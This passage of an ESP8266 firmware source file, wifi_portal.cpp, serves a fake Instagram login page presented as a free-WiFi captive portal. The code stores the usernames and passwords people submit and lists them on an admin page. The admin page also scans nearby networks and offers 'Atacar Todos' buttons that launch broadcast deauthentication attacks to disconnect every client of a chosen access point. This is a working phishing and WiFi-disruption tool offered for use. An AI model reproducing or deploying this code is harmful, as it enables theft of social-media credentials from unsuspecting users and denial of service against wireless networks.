ecsistem/oled-esp8266/src/wifi_portal.cpp
        <div class="container">
          <div class="logo">
            <div class="instagram-logo">Instagram</div>
          </div>
          <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="off" autocapitalize="off">
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>

            <div class="divider">
              <div class="line"></div>
              <div class="or">OR</div>
              <div class="line"></div>
            </div>
          </form>
        </div>

        <div class="container" style="text-align: center; padding: 20px;">
          <span style="color: #262626; font-size: 14px;">Don't have an account? </span>
          <a href="#" style="color: #0095f6; font-weight: 600; text-decoration: none; font-size: 14px;">Sign up</a>
        </div>

        <div class="footer">
          <a href="#">About</a><span>•</span>
          <a href="#">Help</a><span>•</span>
          <a href="#">Privacy</a><span>•</span>
          <a href="#">Terms</a>
        </div>
      </div>
    </body>
    </html>
  )rawliteral";

    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleCredentialSubmit()
  {
    String username = server.arg("username");
    String password = server.arg("password");

    if (username.length() == 0 || password.length() == 0)
    {
      server.send(400, "text/plain; charset=utf-8", "Usuario e senha sao obrigatorios");
      return;
    }

    bool saved = appendCapturedCredential(username, password);

    String page = R"rawliteral(
    <!DOCTYPE html>
    <html>
    <head>
      <title>Instagram • Login for Free WiFi</title>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta http-equiv="refresh" content="3;url=/">
      <style>
        body {
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          margin: 0;
          padding: 0;
          background: #fafafa;
          display: flex;
          align-items: center;
          justify-content: center;
          min-height: 100vh;
        }
        .container {
          width: 350px;
          background: white;
          border: 1px solid #dbdbdb;
          border-radius: 1px;
          padding: 40px 20px;
          text-align: center;
          box-shadow: 0 4px 12px rgba(0,0,0,0.05);
        }
        .instagram-logo {
          font-family: 'Segoe UI', Arial, sans-serif;
          font-size: 36px;
          font-weight: bold;
          background: -webkit-linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
          -webkit-background-clip: text;
          background-clip: text;
          -webkit-text-fill-color: transparent;
          margin-bottom: 20px;
        }
        .success {
          color: #0095f6;
          font-size: 18px;
          margin: 15px 0;
        }
        .error {
          color: #ed4956;
          font-size: 18px;
          margin: 15px 0;
        }
        p {
          color: #8e8e8e;
          font-size: 14px;
          line-height: 1.5;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="instagram-logo">Instagram</div>

        )rawliteral";

    if (saved)
    {
      page += R"rawliteral(
        <div class="success">✅ Acesso recebido com sucesso!</div>
        <br>Redirecionando em 3 segundos...</p>
    )rawliteral";
    }
    else
    {
      page += R"rawliteral(
        <div class="error">❌ Falha ao registrar dados</div>
        <br>Tente novamente.</p>
    )rawliteral";
    }

    page += R"rawliteral(
      </div>
    </body>
    </html>
  )rawliteral";

    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleAdminPortal()
  {
    String wifiOptions = buildWifiSelectOptions();
    wl_status_t staStatus = WiFi.status();
    bool staConnected = staStatus == WL_CONNECTED;
    String credentialsTable = buildCapturedCredentialsTable();

    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";

    page += "<script>";
    // Função para escanear redes
    page += "async function loadNetworks() {";
    page += "  var el = document.getElementById('networksList');";
    page += "  el.innerHTML = '<p class=\"muted\">Escaneando redes...</p>';";
    page += "  try {";
    page += "    var r = await fetch('/api/scan');";
    page += "    var j = await r.json();";
    page += "    if(!j.networks || j.networks.length === 0) {";
    page += "      el.innerHTML = '<p class=\"muted\">Nenhuma rede encontrada.</p>'; return;";
    page += "    }";
    page += "    var html = '<table style=\"width:100%;font-size:13px;border-collapse:collapse\">';";
    page += "    html += '<tr><th>SSID</th><th>Ch</th><th>dBm</th><th>BSSID</th><th>Ação</th></tr>';";
    page += "    for(var i = 0; i < j.networks.length; i++) {";
    page += "      var n = j.networks[i];";
    page += "      html += '<tr><td>' + labEsc(n.ssid||'(oculto)') + '</td><td>' + n.channel + '</td><td>' + n.rssi + '</td>';";
    page += "      html += '<td style=\"font-family:monospace\">' + labEsc(n.bssid) + '</td>';";
    page += "      html += '<td><button onclick=\"deauthAllClients(\\'' + n.bssid + '\\')\" style=\"background:#ff4757;color:white;padding:6px 12px;border:none;border-radius:6px;cursor:pointer\">Atacar Todos</button></td></tr>';";
    page += "    }";
    page += "    html += '</table>';";
    page += "    el.innerHTML = html;";
    page += "  } catch(e) { el.innerHTML = '<p class=\"bad\">Falha no scan.</p>'; }";
    page += "}";

    // Função para atacar TODOS os clientes de uma rede (sem precisar digitar MAC)
    page += "async function deauthAllClients(apBssid) {";
    page += "  if(!confirm('Tem certeza que quer desconectar TODOS os dispositivos desta rede?\\n\\nAP: ' + apBssid)) return;";
    page += "  var url = '/api/deauth?ap=' + encodeURIComponent(apBssid) + '&client=FF:FF:FF:FF:FF:FF&reason=7';";
    page += "  try {";
    page += "    var r = await fetch(url);";
    page += "    var j = await r.json();";
    page += "    alert('🚀 Ataque iniciado contra todos os clientes da rede!\\nAP: ' + apBssid);";
    page += "  } catch(e) { alert('❌ Erro ao enviar deauth'); }";
    page += "}";

    page += "function labEsc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;');}";
    page += "</script>";

